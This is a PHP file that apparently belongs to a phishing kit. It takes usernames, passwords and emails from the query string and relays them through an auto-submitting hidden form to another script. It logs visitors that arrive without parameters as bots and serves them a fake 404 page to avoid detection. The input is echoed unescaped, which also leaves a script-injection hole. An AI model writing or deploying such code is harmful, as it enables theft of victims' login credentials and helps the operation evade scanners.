<?php
session_start();
error_reporting(0);
$username = $_GET['username'];
$password = $_GET['password'];
$email = $_GET['email'];
$file = $_GET['file'];
if($username == "" && $password == "" && $email == "" && $file == ""){
tulis_file("admin/result/total_bot.txt", $ip);
exit(header("HTTP/1.0 404 Not Found"));
}else{
	echo "<form id='boyxd' method='POST' action='".$file.".php'><input type='hidden' name='username' value='".$username."'><input type='hidden' name='password' value='".$password."'><input type='hidden' name='email' value='".$email."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
?>